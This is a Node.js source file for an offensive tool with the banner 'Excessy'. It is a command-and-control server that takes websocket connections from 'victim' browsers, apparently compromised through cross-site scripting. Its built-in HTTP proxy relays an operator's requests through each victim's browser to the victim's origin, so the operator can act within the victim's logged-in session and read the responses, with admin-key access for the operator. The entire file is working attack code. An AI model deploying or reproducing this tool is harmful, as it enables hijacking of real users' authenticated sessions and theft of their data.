"use strict";

const express = require('express');
const http = require('http');
const crypto = require('crypto');
const URL = require('url');

const app = express();
const expressWs = require('express-ws')(app);

const proxySessions = {};

const SESSIONS = [];

const ADMIN_KEY = crypto.randomBytes(16).toString('hex');
const HTTP_PORT = 3000;
const PROXY_PORT = 8888;


async function sendRequestViaVictim(url, headers, method, body) {
    const urlData = new URL.URL(url);
    const session = proxySessions[urlData.origin];
    if (!session) {
        // TODO: what to do when we can't forward the request via the victim?
        return {
            status: 200,
            statusText: 'OK',
            headers: {Connection: 'close'},
            body: '41414141',
        }
    } else {
        const resp = await session.sendRequest(url, headers, method, body);
        const respHeaders = {};

        for (let [name, val] of resp.headers) {
            if (name === 'content-encoding') {
                continue;
            } else if (name === 'content-length') {
                val = parseInt(resp.body.length / 2);
            }
            respHeaders[name] = val;
        }

        resp.headers = respHeaders;

        return resp;
    }
}

const proxyServer = http.createServer((req, res) => {
    const { url, headers, method } = req;
    let body = [];

    req.on('data', chunk => {
        body.push(chunk);
    }).on('end', async () => {
        body = Buffer.concat(body).toString('hex');

        const victimResp = await sendRequestViaVictim(url, headers, method, body);
        res.writeHead(victimResp.status, victimResp.statusText, victimResp.headers);
        res.write(Buffer.from(victimResp.body, 'hex'));
        res.end();

    });
});



class SessionsContainer {
    static createSession(origin) {
        const sessid = crypto.randomBytes(6).toString('hex');
        const sess = new Session(sessid, origin);
        SESSIONS.push(sess);

        return sess;
    }

    static has(sessid) {
        return SESSIONS.some(s => s.id === sessid);
    }

    static get(sessid) {
        return SESSIONS.find(s => s.id === sessid);
    }
}

class Session {
    constructor(id, origin) {
        this.id = id;
        this.origin = origin;
        this.adminWs = null;
        this.clientWs = null;
        this.resolves = {};
    }

    setAdminWs(ws) {
        if (this.adminWs && this.adminWs.readyState === 1 /* OPEN */) {
            this.adminWs.close();
        }

        this.adminWs = ws;

        const onMessage = this.onMessage.bind(this, this.adminWs, true);
        ws.on('message', onMessage);

        this.send(ws, {
            type: 'connected',
        });
    }

    setClientWs(ws) {
        if (this.clientWs && this.clientWs.readyState === 1 /* OPEN */) {
            this.clientWs.close();
        }

        this.clientWs = ws;


        const onMessage = this.onMessage.bind(this, this.clientWs, false);
        ws.on('message', onMessage);

    }

    onMessage(ws, isAdmin, msg) {
        const parsed = JSON.parse(msg);
        const type = parsed.type;
        if (type === 'ping') {
            this.sendPong(ws);
            return;
        } else if (type === 'response') {
            const { id } = parsed;
            this.resolves[id](parsed.response);
            return;
        }

        if (isAdmin) {
            this.clientWs.send(msg);
        } else {
            this.adminWs.send(msg);
        }
    }

    sendPong(ws) {
        this.send(ws, {type: 'pong'});
    }

    send(ws, data) {
        ws.send(JSON.stringify(data));
    }

    randomId(prefix='') {
        return prefix + Math.random().toString().slice(2);
    }

    sendRequest(url, headers, method, body) {
        return new Promise(resolve => {
            const id = this.randomId('req');
            this.resolves[id] = resolve;

            this.send(this.clientWs, {
                url,
                headers,
                method,
                body,
                id,
                type: 'request'
            });

        });
    }
}

app.get('/check-admin-key', (req, res) => {
    const admin = req.header('X-Admin-Key');
    if (admin === ADMIN_KEY) {
        res.json({ status: 'ok'});
    } else {
        res.json({ status: 'err'});
    }
});

function getSessionsInfo() {
    return SESSIONS.map(s => ({
        id: s.id,
        origin: s.origin,
        isAnyAdmin: s.adminWs !== null
    }));
}

app.ws('/ws', (ws, req) => {
    const { admin } = req.query;

    if(admin === ADMIN_KEY) {
        console.log('admin connected');



        const interval = setInterval(function sendSessionsInfo() {
            ws.send(JSON.stringify({
                type: 'sessions',
                sessions: getSessionsInfo(),
            }));
        }, 1000);
        const onSessionMessage = (msg) => {
            msg = JSON.parse(msg);
            if (msg.type === 'session') {
                const id = msg.id;

                if (SessionsContainer.has(id)) {
                    const sess = SessionsContainer.get(id);
                    sess.setAdminWs(ws);
                    clearInterval(interval);
                    // TODO: why ws.removeListener(onSessionMessage) doesn't work?!
                }
            }
        };
        ws.on('message', onSessionMessage);

    } else {
        const origin = req.header('origin');
        const sess = SessionsContainer.createSession(origin);
        console.log('victim connected from origin ' + origin);
        proxySessions[origin] = sess;
        sess.setClientWs(ws);
    }
});

app.use(express.static('public'));

proxyServer.listen(PROXY_PORT);
app.listen(HTTP_PORT);

console.log(`\n\n      _____
     |  ___|
     | |____  _____ ___  ___ ___ _   _
     |  __\\ \\/ / __/ _ \\/ __/ __| | | |
     | |___>  < (_|  __/\\__ \\__ \\ |_| |
     \\____/_/\\_\\___\\___||___/___/\\__, |
                                  __/ |
                                 |___/\n\n`);
console.log(`Your admin key is ${ADMIN_KEY}\nThe server listens at port ${HTTP_PORT}.\nThe proxy listens at port ${PROXY_PORT}.`);
